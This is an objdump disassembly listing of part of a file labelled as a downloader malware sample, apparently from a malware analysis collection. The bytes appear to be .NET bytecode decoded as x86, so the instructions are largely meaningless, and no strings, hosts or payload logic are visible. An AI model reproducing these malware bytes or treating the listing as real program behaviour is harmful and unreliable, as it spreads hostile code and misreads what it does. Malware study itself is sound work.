
malware_samples/downloader/62d183e9bfa8eedfcb7f2ad75c419f38088e8a600dde6286f122bd7b567144f5.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	3e 08 02             	or     %al,%ds:(%edx)
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 b8 7b 00       	add    $0x7bb800,%eax
  402013:	00 60 36             	add    %ah,0x36(%eax)
  402016:	00 00                	add    %al,(%eax)
  402018:	03 00                	add    (%eax),%eax
  40201a:	02 00                	add    (%eax),%al
  40201c:	3a 00                	cmp    (%eax),%al
  40201e:	00 06                	add    %al,(%esi)
  402020:	18 b2 00 00 50 55    	sbb    %dh,0x55500000(%edx)
  402026:	01 00                	add    %eax,(%eax)
	...
  402050:	8a 02                	mov    (%edx),%al
  402052:	73 43                	jae    0x402097
  402054:	00 00                	add    %al,(%eax)
  402056:	06                   	push   %es
  402057:	7d 01                	jge    0x40205a
  402059:	00 00                	add    %al,(%eax)
  40205b:	04 02                	add    $0x2,%al
  40205d:	14 7d                	adc    $0x7d,%al
  40205f:	04 00                	add    $0x0,%al
  402061:	00 04 02             	add    %al,(%edx,%eax,1)
  402064:	28 19                	sub    %bl,(%ecx)
  402066:	00 00                	add    %al,(%eax)
  402068:	0a 00                	or     (%eax),%al
  40206a:	00 02                	add    %al,(%edx)
  40206c:	28 1d 00 00 06 00    	sub    %bl,0x60000
  402072:	2a 00                	sub    (%eax),%al
  402074:	13 30                	adc    (%eax),%esi
  402076:	03 00                	add    (%eax),%eax
  402078:	38 00                	cmp    %al,(%eax)
  40207a:	00 00                	add    %al,(%eax)
  40207c:	01 00                	add    %eax,(%eax)
  40207e:	00 11                	add    %dl,(%ecx)
  402080:	00 02                	add    %al,(%edx)
  402082:	28 1a                	sub    %bl,(%edx)
  402084:	00 00                	add    %al,(%eax)
  402086:	0a 0a                	or     (%edx),%cl
  402088:	12 00                	adc    (%eax),%al
  40208a:	28 1b                	sub    %bl,(%ebx)
  40208c:	00 00                	add    %al,(%eax)
  40208e:	0a 02                	or     (%edx),%al
  402090:	7b 02                	jnp    0x402094
  402092:	00 00                	add    %al,(%eax)
  402094:	04 59                	add    $0x59,%al
  402096:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402099:	00 0a                	add    %cl,(%edx)
  40209b:	00 02                	add    %al,(%edx)
  40209d:	28 1a                	sub    %bl,(%edx)
  40209f:	00 00                	add    %al,(%eax)
  4020a1:	0a 0a                	or     (%edx),%cl
  4020a3:	12 00                	adc    (%eax),%al
  4020a5:	28 1d 00 00 0a 02    	sub    %bl,0x20a0000
  4020ab:	7b 03                	jnp    0x4020b0
  4020ad:	00 00                	add    %al,(%eax)
  4020af:	04 59                	add    $0x59,%al
  4020b1:	28 1e                	sub    %bl,(%esi)
  4020b3:	00 00                	add    %al,(%eax)
  4020b5:	0a 00                	or     (%eax),%al
  4020b7:	2a 3e                	sub    (%esi),%bh
  4020b9:	00 02                	add    %al,(%edx)
  4020bb:	7b 0b                	jnp    0x4020c8
  4020bd:	00 00                	add    %al,(%eax)
  4020bf:	04 16                	add    $0x16,%al
  4020c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4020c2:	1f                   	pop    %ds
  4020c3:	00 00                	add    %al,(%eax)
  4020c5:	0a 00                	or     (%eax),%al
  4020c7:	2a 22                	sub    (%edx),%ah
  4020c9:	00 28                	add    %ch,(%eax)
  4020cb:	20 00                	and    %al,(%eax)
  4020cd:	00 0a                	add    %cl,(%edx)
  4020cf:	00 2a                	add    %ch,(%edx)
  4020d1:	2a 00                	sub    (%eax),%al
  4020d3:	02 17                	add    (%edi),%dl
  4020d5:	28 21                	sub    %ah,(%ecx)
  4020d7:	00 00                	add    %al,(%eax)
  4020d9:	0a 00                	or     (%eax),%al
  4020db:	2a 0a                	sub    (%edx),%cl
  4020dd:	00 2a                	add    %ch,(%edx)
  4020df:	00 13                	add    %dl,(%ebx)
  4020e1:	30 01                	xor    %al,(%ecx)
  4020e3:	00 0f                	add    %cl,(%edi)
  4020e5:	00 00                	add    %al,(%eax)
  4020e7:	00 02                	add    %al,(%edx)
  4020e9:	00 00                	add    %al,(%eax)
  4020eb:	11 00                	adc    %eax,(%eax)
  4020ed:	72 01                	jb     0x4020f0
  4020ef:	00 00                	add    %al,(%eax)
  4020f1:	70 0a                	jo     0x4020fd
  4020f3:	06                   	push   %es
  4020f4:	28 22                	sub    %ah,(%edx)
  4020f6:	00 00                	add    %al,(%eax)
  4020f8:	0a 26                	or     (%esi),%ah
  4020fa:	2a 0a                	sub    (%edx),%cl
  4020fc:	00 2a                	add    %ch,(%edx)
  4020fe:	3a 00                	cmp    (%eax),%al
  402100:	02 7b 01             	add    0x1(%ebx),%bh
  402103:	00 00                	add    %al,(%eax)
  402105:	04 6f                	add    $0x6f,%al
  402107:	23 00                	and    (%eax),%eax
  402109:	00 0a                	add    %cl,(%edx)
  40210b:	00 2a                	add    %ch,(%edx)
  40210d:	3a 00                	cmp    (%eax),%al
  40210f:	02 7b 01             	add    0x1(%ebx),%bh
  402112:	00 00                	add    %al,(%eax)
  402114:	04 6f                	add    $0x6f,%al
  402116:	23 00                	and    (%eax),%eax
  402118:	00 0a                	add    %cl,(%edx)
  40211a:	00 2a                	add    %ch,(%edx)
  40211c:	3a 00                	cmp    (%eax),%al
  40211e:	02 7b 01             	add    0x1(%ebx),%bh
  402121:	00 00                	add    %al,(%eax)
  402123:	04 6f                	add    $0x6f,%al
  402125:	23 00                	and    (%eax),%eax
  402127:	00 0a                	add    %cl,(%edx)
  402129:	00 2a                	add    %ch,(%edx)
  40212b:	3a 00                	cmp    (%eax),%al
  40212d:	02 7b 01             	add    0x1(%ebx),%bh
  402130:	00 00                	add    %al,(%eax)
  402132:	04 6f                	add    $0x6f,%al
  402134:	23 00                	and    (%eax),%eax
  402136:	00 0a                	add    %cl,(%edx)
  402138:	00 2a                	add    %ch,(%edx)
  40213a:	3a 00                	cmp    (%eax),%al
  40213c:	02 7b 01             	add    0x1(%ebx),%bh
  40213f:	00 00                	add    %al,(%eax)
  402141:	04 6f                	add    $0x6f,%al
  402143:	23 00                	and    (%eax),%eax
  402145:	00 0a                	add    %cl,(%edx)
  402147:	00 2a                	add    %ch,(%edx)
  402149:	3a 00                	cmp    (%eax),%al
  40214b:	02 7b 01             	add    0x1(%ebx),%bh
  40214e:	00 00                	add    %al,(%eax)
  402150:	04 6f                	add    $0x6f,%al
  402152:	23 00                	and    (%eax),%eax
  402154:	00 0a                	add    %cl,(%edx)
  402156:	00 2a                	add    %ch,(%edx)
  402158:	3a 00                	cmp    (%eax),%al
  40215a:	02 7b 01             	add    0x1(%ebx),%bh
  40215d:	00 00                	add    %al,(%eax)
  40215f:	04 6f                	add    $0x6f,%al
  402161:	23 00                	and    (%eax),%eax
  402163:	00 0a                	add    %cl,(%edx)
  402165:	00 2a                	add    %ch,(%edx)
  402167:	3a 00                	cmp    (%eax),%al
  402169:	02 7b 01             	add    0x1(%ebx),%bh
  40216c:	00 00                	add    %al,(%eax)
  40216e:	04 6f                	add    $0x6f,%al
  402170:	23 00                	and    (%eax),%eax
  402172:	00 0a                	add    %cl,(%edx)
  402174:	00 2a                	add    %ch,(%edx)
  402176:	3a 00                	cmp    (%eax),%al
  402178:	02 7b 01             	add    0x1(%ebx),%bh
  40217b:	00 00                	add    %al,(%eax)
  40217d:	04 6f                	add    $0x6f,%al
  40217f:	23 00                	and    (%eax),%eax
  402181:	00 0a                	add    %cl,(%edx)
  402183:	00 2a                	add    %ch,(%edx)
  402185:	3a 00                	cmp    (%eax),%al
  402187:	02 7b 01             	add    0x1(%ebx),%bh
  40218a:	00 00                	add    %al,(%eax)
  40218c:	04 6f                	add    $0x6f,%al
  40218e:	23 00                	and    (%eax),%eax
  402190:	00 0a                	add    %cl,(%edx)
  402192:	00 2a                	add    %ch,(%edx)
  402194:	3a 00                	cmp    (%eax),%al
  402196:	02 7b 01             	add    0x1(%ebx),%bh
  402199:	00 00                	add    %al,(%eax)
  40219b:	04 6f                	add    $0x6f,%al
  40219d:	23 00                	and    (%eax),%eax
  40219f:	00 0a                	add    %cl,(%edx)
  4021a1:	00 2a                	add    %ch,(%edx)
  4021a3:	3a 00                	cmp    (%eax),%al
  4021a5:	02 7b 01             	add    0x1(%ebx),%bh
  4021a8:	00 00                	add    %al,(%eax)
  4021aa:	04 6f                	add    $0x6f,%al
  4021ac:	23 00                	and    (%eax),%eax
  4021ae:	00 0a                	add    %cl,(%edx)
  4021b0:	00 2a                	add    %ch,(%edx)
  4021b2:	3a 00                	cmp    (%eax),%al
  4021b4:	02 7b 01             	add    0x1(%ebx),%bh
  4021b7:	00 00                	add    %al,(%eax)
  4021b9:	04 6f                	add    $0x6f,%al
  4021bb:	23 00                	and    (%eax),%eax
  4021bd:	00 0a                	add    %cl,(%edx)
  4021bf:	00 2a                	add    %ch,(%edx)
  4021c1:	3a 00                	cmp    (%eax),%al
  4021c3:	02 7b 01             	add    0x1(%ebx),%bh
  4021c6:	00 00                	add    %al,(%eax)
  4021c8:	04 6f                	add    $0x6f,%al
  4021ca:	23 00                	and    (%eax),%eax
  4021cc:	00 0a                	add    %cl,(%edx)
  4021ce:	00 2a                	add    %ch,(%edx)
  4021d0:	3a 00                	cmp    (%eax),%al
  4021d2:	02 7b 01             	add    0x1(%ebx),%bh
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 6f                	add    $0x6f,%al
  4021d9:	23 00                	and    (%eax),%eax
  4021db:	00 0a                	add    %cl,(%edx)
  4021dd:	00 2a                	add    %ch,(%edx)
  4021df:	00 13                	add    %dl,(%ebx)
  4021e1:	30 01                	xor    %al,(%ecx)
  4021e3:	00 0f                	add    %cl,(%edi)
  4021e5:	00 00                	add    %al,(%eax)
  4021e7:	00 02                	add    %al,(%edx)
  4021e9:	00 00                	add    %al,(%eax)
  4021eb:	11 00                	adc    %eax,(%eax)
  4021ed:	72 6d                	jb     0x40225c
  4021ef:	00 00                	add    %al,(%eax)
  4021f1:	70 0a                	jo     0x4021fd
  4021f3:	06                   	push   %es
  4021f4:	28 22                	sub    %ah,(%edx)
  4021f6:	00 00                	add    %al,(%eax)
  4021f8:	0a 26                	or     (%esi),%ah
  4021fa:	2a 00                	sub    (%eax),%al
  4021fc:	13 30                	adc    (%eax),%esi
  4021fe:	01 00                	add    %eax,(%eax)
  402200:	0f 00 00             	sldt   (%eax)
  402203:	00 02                	add    %al,(%edx)
  402205:	00 00                	add    %al,(%eax)
  402207:	11 00                	adc    %eax,(%eax)
  402209:	72 d9                	jb     0x4021e4
  40220b:	00 00                	add    %al,(%eax)
  40220d:	70 0a                	jo     0x402219
  40220f:	06                   	push   %es
  402210:	28 22                	sub    %ah,(%edx)
  402212:	00 00                	add    %al,(%eax)
  402214:	0a 26                	or     (%esi),%ah
  402216:	2a 00                	sub    (%eax),%al
  402218:	13 30                	adc    (%eax),%esi
  40221a:	01 00                	add    %eax,(%eax)
  40221c:	0f 00 00             	sldt   (%eax)
  40221f:	00 02                	add    %al,(%edx)
  402221:	00 00                	add    %al,(%eax)
  402223:	11 00                	adc    %eax,(%eax)
  402225:	72 45                	jb     0x40226c
  402227:	01 00                	add    %eax,(%eax)
  402229:	70 0a                	jo     0x402235
  40222b:	06                   	push   %es
  40222c:	28 22                	sub    %ah,(%edx)
  40222e:	00 00                	add    %al,(%eax)
  402230:	0a 26                	or     (%esi),%ah
  402232:	2a 00                	sub    (%eax),%al
  402234:	13 30                	adc    (%eax),%esi
  402236:	03 00                	add    (%eax),%eax
  402238:	43                   	inc    %ebx
  402239:	00 00                	add    %al,(%eax)
  40223b:	00 01                	add    %al,(%ecx)
  40223d:	00 00                	add    %al,(%eax)
  40223f:	11 00                	adc    %eax,(%eax)
  402241:	02 28                	add    (%eax),%ch
  402243:	1a 00                	sbb    (%eax),%al
  402245:	00 0a                	add    %cl,(%edx)
  402247:	0a 12                	or     (%edx),%dl
  402249:	00 28                	add    %ch,(%eax)
  40224b:	1b 00                	sbb    (%eax),%eax
  40224d:	00 0a                	add    %cl,(%edx)
  40224f:	02 28                	add    (%eax),%ch
  402251:	24 00                	and    $0x0,%al
  402253:	00 0a                	add    %cl,(%edx)
  402255:	59                   	pop    %ecx
  402256:	7d 02                	jge    0x40225a
  402258:	00 00                	add    %al,(%eax)
  40225a:	04 02                	add    $0x2,%al
  40225c:	28 1a                	sub    %bl,(%edx)
  40225e:	00 00                	add    %al,(%eax)
  402260:	0a 0a                	or     (%edx),%cl
  402262:	12 00                	adc    (%eax),%al
  402264:	28 1d 00 00 0a 02    	sub    %bl,0x20a0000
  40226a:	28 25 00 00 0a 59    	sub    %ah,0x590a0000
  402270:	7d 03                	jge    0x402275
  402272:	00 00                	add    %al,(%eax)
  402274:	04 02                	add    $0x2,%al
  402276:	7b 0b                	jnp    0x402283
  402278:	00 00                	add    %al,(%eax)
  40227a:	04 17                	add    $0x17,%al
  40227c:	6f                   	outsl  %ds:(%esi),(%dx)
  40227d:	1f                   	pop    %ds
  40227e:	00 00                	add    %al,(%eax)
  402280:	0a 00                	or     (%eax),%al
  402282:	2a 00                	sub    (%eax),%al
  402284:	13 30                	adc    (%eax),%esi
  402286:	02 00                	add    (%eax),%al
  402288:	2b 00                	sub    (%eax),%eax
  40228a:	00 00                	add    %al,(%eax)
  40228c:	03 00                	add    (%eax),%eax
  40228e:	00 11                	add    %dl,(%ecx)
  402290:	00 03                	add    %al,(%ebx)
  402292:	2c 0b                	sub    $0xb,%al
  402294:	02 7b 04             	add    0x4(%ebx),%bh
  402297:	00 00                	add    %al,(%eax)
  402299:	04 14                	add    $0x14,%al
  40229b:	fe 03                	incb   (%ebx)
  40229d:	2b 01                	sub    (%ecx),%eax
  40229f:	16                   	push   %ss
  4022a0:	0a 06                	or     (%esi),%al
  4022a2:	2c 0e                	sub    $0xe,%al
  4022a4:	00 02                	add    %al,(%edx)
  4022a6:	7b 04                	jnp    0x4022ac
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	04 6f                	add    $0x6f,%al
  4022ac:	26 00 00             	add    %al,%es:(%eax)
  4022af:	0a 00                	or     (%eax),%al
  4022b1:	00 02                	add    %al,(%edx)
  4022b3:	03 28                	add    (%eax),%ebp
  4022b5:	27                   	daa
  4022b6:	00 00                	add    %al,(%eax)
  4022b8:	0a 00                	or     (%eax),%al
  4022ba:	2a 00                	sub    (%eax),%al
  4022bc:	13 30                	adc    (%eax),%esi
  4022be:	06                   	push   %es
  4022bf:	00 67 29             	add    %ah,0x29(%edi)
  4022c2:	00 00                	add    %al,(%eax)
  4022c4:	04 00                	add    $0x0,%al
  4022c6:	00 11                	add    %dl,(%ecx)
  4022c8:	00 02                	add    %al,(%edx)
  4022ca:	73 28                	jae    0x4022f4
  4022cc:	00 00                	add    %al,(%eax)
  4022ce:	0a 7d 04             	or     0x4(%ebp),%bh
  4022d1:	00 00                	add    %al,(%eax)
  4022d3:	04 d0                	add    $0xd0,%al
  4022d5:	02 00                	add    (%eax),%al
  4022d7:	00 02                	add    %al,(%edx)
  4022d9:	28 29                	sub    %ch,(%ecx)
  4022db:	00 00                	add    %al,(%eax)
  4022dd:	0a 73 2a             	or     0x2a(%ebx),%dh
  4022e0:	00 00                	add    %al,(%eax)
  4022e2:	0a 0a                	or     (%edx),%cl
  4022e4:	02 73 2b             	add    0x2b(%ebx),%dh
  4022e7:	00 00                	add    %al,(%eax)
  4022e9:	0a 7d 05             	or     0x5(%ebp),%bh
  4022ec:	00 00                	add    %al,(%eax)
  4022ee:	04 02                	add    $0x2,%al
  4022f0:	73 2b                	jae    0x40231d
  4022f2:	00 00                	add    %al,(%eax)
  4022f4:	0a 7d 06             	or     0x6(%ebp),%bh
  4022f7:	00 00                	add    %al,(%eax)
  4022f9:	04 02                	add    $0x2,%al
  4022fb:	73 2b                	jae    0x402328
  4022fd:	00 00                	add    %al,(%eax)
  4022ff:	0a 7d 07             	or     0x7(%ebp),%bh
  402302:	00 00                	add    %al,(%eax)
  402304:	04 02                	add    $0x2,%al
  402306:	73 2b                	jae    0x402333
  402308:	00 00                	add    %al,(%eax)
  40230a:	0a 7d 08             	or     0x8(%ebp),%bh
  40230d:	00 00                	add    %al,(%eax)
  40230f:	04 02                	add    $0x2,%al
  402311:	73 2c                	jae    0x40233f
  402313:	00 00                	add    %al,(%eax)
  402315:	0a 7d 09             	or     0x9(%ebp),%bh
  402318:	00 00                	add    %al,(%eax)
  40231a:	04 02                	add    $0x2,%al
  40231c:	73 2c                	jae    0x40234a
  40231e:	00 00                	add    %al,(%eax)
  402320:	0a 7d 0a             	or     0xa(%ebp),%bh
  402323:	00 00                	add    %al,(%eax)
  402325:	04 02                	add    $0x2,%al
  402327:	02 7b 04             	add    0x4(%ebx),%bh
  40232a:	00 00                	add    %al,(%eax)
  40232c:	04 73                	add    $0x73,%al
  40232e:	2d 00 00 0a 7d       	sub    $0x7d0a0000,%eax
  402333:	0b 00                	or     (%eax),%eax
  402335:	00 04 02             	add    %al,(%edx,%eax,1)
  402338:	73 2e                	jae    0x402368
  40233a:	00 00                	add    %al,(%eax)
  40233c:	0a 7d 0c             	or     0xc(%ebp),%bh
  40233f:	00 00                	add    %al,(%eax)
  402341:	04 02                	add    $0x2,%al
  402343:	73 2c                	jae    0x402371
  402345:	00 00                	add    %al,(%eax)
  402347:	0a 7d 21             	or     0x21(%ebp),%bh
  40234a:	00 00                	add    %al,(%eax)
  40234c:	04 02                	add    $0x2,%al
  40234e:	73 2c                	jae    0x40237c
  402350:	00 00                	add    %al,(%eax)
  402352:	0a 7d 22             	or     0x22(%ebp),%bh
  402355:	00 00                	add    %al,(%eax)
  402357:	04 02                	add    $0x2,%al
  402359:	73 2c                	jae    0x402387
  40235b:	00 00                	add    %al,(%eax)
  40235d:	0a 7d 23             	or     0x23(%ebp),%bh
  402360:	00 00                	add    %al,(%eax)
  402362:	04 02                	add    $0x2,%al
  402364:	73 2c                	jae    0x402392
  402366:	00 00                	add    %al,(%eax)
  402368:	0a 7d 24             	or     0x24(%ebp),%bh
  40236b:	00 00                	add    %al,(%eax)
  40236d:	04 02                	add    $0x2,%al
  40236f:	73 2c                	jae    0x40239d
  402371:	00 00                	add    %al,(%eax)
  402373:	0a 7d 12             	or     0x12(%ebp),%bh
  402376:	00 00                	add    %al,(%eax)
  402378:	04 02                	add    $0x2,%al
  40237a:	73 2c                	jae    0x4023a8
  40237c:	00 00                	add    %al,(%eax)
  40237e:	0a 7d 13             	or     0x13(%ebp),%bh
  402381:	00 00                	add    %al,(%eax)
  402383:	04 02                	add    $0x2,%al
  402385:	73 2c                	jae    0x4023b3
  402387:	00 00                	add    %al,(%eax)
  402389:	0a 7d 14             	or     0x14(%ebp),%bh
  40238c:	00 00                	add    %al,(%eax)
  40238e:	04 02                	add    $0x2,%al
  402390:	73 2c                	jae    0x4023be
  402392:	00 00                	add    %al,(%eax)
  402394:	0a 7d 15             	or     0x15(%ebp),%bh
  402397:	00 00                	add    %al,(%eax)
  402399:	04 02                	add    $0x2,%al
  40239b:	73 2c                	jae    0x4023c9
  40239d:	00 00                	add    %al,(%eax)
  40239f:	0a 7d 16             	or     0x16(%ebp),%bh
  4023a2:	00 00                	add    %al,(%eax)
  4023a4:	04 02                	add    $0x2,%al
  4023a6:	73 2c                	jae    0x4023d4
  4023a8:	00 00                	add    %al,(%eax)
  4023aa:	0a 7d 17             	or     0x17(%ebp),%bh
  4023ad:	00 00                	add    %al,(%eax)
  4023af:	04 02                	add    $0x2,%al
  4023b1:	73 2c                	jae    0x4023df
  4023b3:	00 00                	add    %al,(%eax)
  4023b5:	0a 7d 18             	or     0x18(%ebp),%bh
  4023b8:	00 00                	add    %al,(%eax)
  4023ba:	04 02                	add    $0x2,%al
  4023bc:	73 2c                	jae    0x4023ea
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	0a 7d 19             	or     0x19(%ebp),%bh
  4023c3:	00 00                	add    %al,(%eax)
  4023c5:	04 02                	add    $0x2,%al
  4023c7:	73 2b                	jae    0x4023f4
  4023c9:	00 00                	add    %al,(%eax)
  4023cb:	0a 7d 0d             	or     0xd(%ebp),%bh
  4023ce:	00 00                	add    %al,(%eax)
  4023d0:	04 02                	add    $0x2,%al
  4023d2:	73 2e                	jae    0x402402
  4023d4:	00 00                	add    %al,(%eax)
  4023d6:	0a 7d 0e             	or     0xe(%ebp),%bh
  4023d9:	00 00                	add    %al,(%eax)
  4023db:	04 02                	add    $0x2,%al
  4023dd:	73 2e                	jae    0x40240d
  4023df:	00 00                	add    %al,(%eax)
  4023e1:	0a 7d 0f             	or     0xf(%ebp),%bh
  4023e4:	00 00                	add    %al,(%eax)
  4023e6:	04 02                	add    $0x2,%al
  4023e8:	73 2c                	jae    0x402416
  4023ea:	00 00                	add    %al,(%eax)
  4023ec:	0a 7d 1a             	or     0x1a(%ebp),%bh
  4023ef:	00 00                	add    %al,(%eax)
  4023f1:	04 02                	add    $0x2,%al
  4023f3:	73 2c                	jae    0x402421
  4023f5:	00 00                	add    %al,(%eax)
  4023f7:	0a 7d 1b             	or     0x1b(%ebp),%bh
  4023fa:	00 00                	add    %al,(%eax)
  4023fc:	04 02                	add    $0x2,%al
  4023fe:	73 2c                	jae    0x40242c
  402400:	00 00                	add    %al,(%eax)
  402402:	0a 7d 1c             	or     0x1c(%ebp),%bh
  402405:	00 00                	add    %al,(%eax)
  402407:	04 02                	add    $0x2,%al
  402409:	73 2c                	jae    0x402437
  40240b:	00 00                	add    %al,(%eax)
  40240d:	0a 7d 1d             	or     0x1d(%ebp),%bh
  402410:	00 00                	add    %al,(%eax)
  402412:	04 02                	add    $0x2,%al
  402414:	73 2c                	jae    0x402442
  402416:	00 00                	add    %al,(%eax)
  402418:	0a 7d 1e             	or     0x1e(%ebp),%bh
  40241b:	00 00                	add    %al,(%eax)
  40241d:	04 02                	add    $0x2,%al
  40241f:	73 2c                	jae    0x40244d
  402421:	00 00                	add    %al,(%eax)
  402423:	0a 7d 1f             	or     0x1f(%ebp),%bh
  402426:	00 00                	add    %al,(%eax)
  402428:	04 02                	add    $0x2,%al
  40242a:	73 2c                	jae    0x402458
  40242c:	00 00                	add    %al,(%eax)
  40242e:	0a 7d 20             	or     0x20(%ebp),%bh
  402431:	00 00                	add    %al,(%eax)
  402433:	04 02                	add    $0x2,%al
  402435:	73 2b                	jae    0x402462
  402437:	00 00                	add    %al,(%eax)
  402439:	0a 7d 10             	or     0x10(%ebp),%bh
  40243c:	00 00                	add    %al,(%eax)
  40243e:	04 02                	add    $0x2,%al
  402440:	73 2e                	jae    0x402470
  402442:	00 00                	add    %al,(%eax)
  402444:	0a 7d 11             	or     0x11(%ebp),%bh
  402447:	00 00                	add    %al,(%eax)
  402449:	04 02                	add    $0x2,%al
  40244b:	73 2b                	jae    0x402478
  40244d:	00 00                	add    %al,(%eax)
  40244f:	0a 7d 25             	or     0x25(%ebp),%bh
  402452:	00 00                	add    %al,(%eax)
  402454:	04 02                	add    $0x2,%al
  402456:	73 2f                	jae    0x402487
  402458:	00 00                	add    %al,(%eax)
  40245a:	0a 7d 26             	or     0x26(%ebp),%bh
  40245d:	00 00                	add    %al,(%eax)
  40245f:	04 02                	add    $0x2,%al
  402461:	7b 0c                	jnp    0x40246f
  402463:	00 00                	add    %al,(%eax)
  402465:	04 6f                	add    $0x6f,%al
  402467:	30 00                	xor    %al,(%eax)
  402469:	00 0a                	add    %cl,(%edx)
  40246b:	00 02                	add    %al,(%edx)
  40246d:	7b 0f                	jnp    0x40247e
  40246f:	00 00                	add    %al,(%eax)
  402471:	04 6f                	add    $0x6f,%al
  402473:	30 00                	xor    %al,(%eax)
  402475:	00 0a                	add    %cl,(%edx)
  402477:	00 02                	add    %al,(%edx)
  402479:	7b 26                	jnp    0x4024a1
  40247b:	00 00                	add    %al,(%eax)
  40247d:	04 6f                	add    $0x6f,%al
  40247f:	31 00                	xor    %eax,(%eax)
  402481:	00 0a                	add    %cl,(%edx)
  402483:	00 02                	add    %al,(%edx)
  402485:	28 30                	sub    %dh,(%eax)
  402487:	00 00                	add    %al,(%eax)
  402489:	0a 00                	or     (%eax),%al
  40248b:	02 7b 05             	add    0x5(%ebx),%bh
  40248e:	00 00                	add    %al,(%eax)
  402490:	04 20                	add    $0x20,%al
  402492:	d8 00                	fadds  (%eax)
  402494:	00 00                	add    %al,(%eax)
  402496:	16                   	push   %ss
  402497:	1f                   	pop    %ds
  402498:	32 28                	xor    (%eax),%ch
  40249a:	32 00                	xor    (%eax),%al
  40249c:	00 0a                	add    %cl,(%edx)
  40249e:	6f                   	outsl  %ds:(%esi),(%dx)
  40249f:	33 00                	xor    (%eax),%eax
  4024a1:	00 0a                	add    %cl,(%edx)
  4024a3:	00 02                	add    %al,(%edx)
  4024a5:	7b 05                	jnp    0x4024ac
  4024a7:	00 00                	add    %al,(%eax)
  4024a9:	04 17                	add    $0x17,%al
  4024ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4024ac:	34 00                	xor    $0x0,%al
  4024ae:	00 0a                	add    %cl,(%edx)
  4024b0:	00 02                	add    %al,(%edx)
  4024b2:	7b 05                	jnp    0x4024b9
  4024b4:	00 00                	add    %al,(%eax)
  4024b6:	04 16                	add    $0x16,%al
  4024b8:	16                   	push   %ss
  4024b9:	73 35                	jae    0x4024f0
  4024bb:	00 00                	add    %al,(%eax)
  4024bd:	0a 6f 36             	or     0x36(%edi),%ch
  4024c0:	00 00                	add    %al,(%eax)
  4024c2:	0a 00                	or     (%eax),%al
  4024c4:	02 7b 05             	add    0x5(%ebx),%bh
  4024c7:	00 00                	add    %al,(%eax)
  4024c9:	04 72                	add    $0x72,%al
  4024cb:	b3 01                	mov    $0x1,%bl
  4024cd:	00 70 6f             	add    %dh,0x6f(%eax)
  4024d0:	37                   	aaa
  4024d1:	00 00                	add    %al,(%eax)
  4024d3:	0a 00                	or     (%eax),%al
  4024d5:	02 7b 05             	add    0x5(%ebx),%bh
  4024d8:	00 00                	add    %al,(%eax)
  4024da:	04 20                	add    $0x20,%al
  4024dc:	7f 01                	jg     0x4024df
  4024de:	00 00                	add    %al,(%eax)
  4024e0:	1f                   	pop    %ds
  4024e1:	27                   	daa
  4024e2:	73 38                	jae    0x40251c
  4024e4:	00 00                	add    %al,(%eax)
  4024e6:	0a 6f 39             	or     0x39(%edi),%ch
  4024e9:	00 00                	add    %al,(%eax)
  4024eb:	0a 00                	or     (%eax),%al
  4024ed:	02 7b 05             	add    0x5(%ebx),%bh
  4024f0:	00 00                	add    %al,(%eax)
  4024f2:	04 16                	add    $0x16,%al
  4024f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4024f5:	3a 00                	cmp    (%eax),%al
  4024f7:	00 0a                	add    %cl,(%edx)
  4024f9:	00 02                	add    %al,(%edx)
  4024fb:	7b 05                	jnp    0x402502
  4024fd:	00 00                	add    %al,(%eax)
  4024ff:	04 02                	add    $0x2,%al
  402501:	fe 06                	incb   (%esi)
  402503:	1b 00                	sbb    (%eax),%eax
  402505:	00 06                	add    %al,(%esi)
  402507:	73 3b                	jae    0x402544
  402509:	00 00                	add    %al,(%eax)
  40250b:	0a 6f 3c             	or     0x3c(%edi),%ch
  40250e:	00 00                	add    %al,(%eax)
  402510:	0a 00                	or     (%eax),%al
  402512:	02 7b 05             	add    0x5(%ebx),%bh
  402515:	00 00                	add    %al,(%eax)
  402517:	04 02                	add    $0x2,%al
  402519:	fe 06                	incb   (%esi)
  40251b:	03 00                	add    (%eax),%eax
  40251d:	00 06                	add    %al,(%esi)
  40251f:	73 3b                	jae    0x40255c
  402521:	00 00                	add    %al,(%eax)
  402523:	0a 6f 3d             	or     0x3d(%edi),%ch
  402526:	00 00                	add    %al,(%eax)
  402528:	0a 00                	or     (%eax),%al
  40252a:	02 7b 06             	add    0x6(%ebx),%bh
  40252d:	00 00                	add    %al,(%eax)
  40252f:	04 20                	add    $0x20,%al
  402531:	d8 00                	fadds  (%eax)
  402533:	00 00                	add    %al,(%eax)
  402535:	16                   	push   %ss
  402536:	1f                   	pop    %ds
  402537:	32 28                	xor    (%eax),%ch
  402539:	32 00                	xor    (%eax),%al
  40253b:	00 0a                	add    %cl,(%edx)
  40253d:	6f                   	outsl  %ds:(%esi),(%dx)
  40253e:	33 00                	xor    (%eax),%eax
  402540:	00 0a                	add    %cl,(%edx)
  402542:	00 02                	add    %al,(%edx)
  402544:	7b 06                	jnp    0x40254c
  402546:	00 00                	add    %al,(%eax)
  402548:	04 19                	add    $0x19,%al
  40254a:	6f                   	outsl  %ds:(%esi),(%dx)
  40254b:	34 00                	xor    $0x0,%al
  40254d:	00 0a                	add    %cl,(%edx)
  40254f:	00 02                	add    %al,(%edx)
  402551:	7b 06                	jnp    0x402559
  402553:	00 00                	add    %al,(%eax)
  402555:	04 16                	add    $0x16,%al
  402557:	1f                   	pop    %ds
  402558:	27                   	daa
  402559:	73 35                	jae    0x402590
  40255b:	00 00                	add    %al,(%eax)
  40255d:	0a 6f 36             	or     0x36(%edi),%ch
  402560:	00 00                	add    %al,(%eax)
  402562:	0a 00                	or     (%eax),%al
  402564:	02 7b 06             	add    0x6(%ebx),%bh
  402567:	00 00                	add    %al,(%eax)
  402569:	04 72                	add    $0x72,%al
  40256b:	c1 01 00             	roll   $0x0,(%ecx)
  40256e:	70 6f                	jo     0x4025df
  402570:	37                   	aaa
  402571:	00 00                	add    %al,(%eax)
  402573:	0a 00                	or     (%eax),%al
  402575:	02 7b 06             	add    0x6(%ebx),%bh
  402578:	00 00                	add    %al,(%eax)
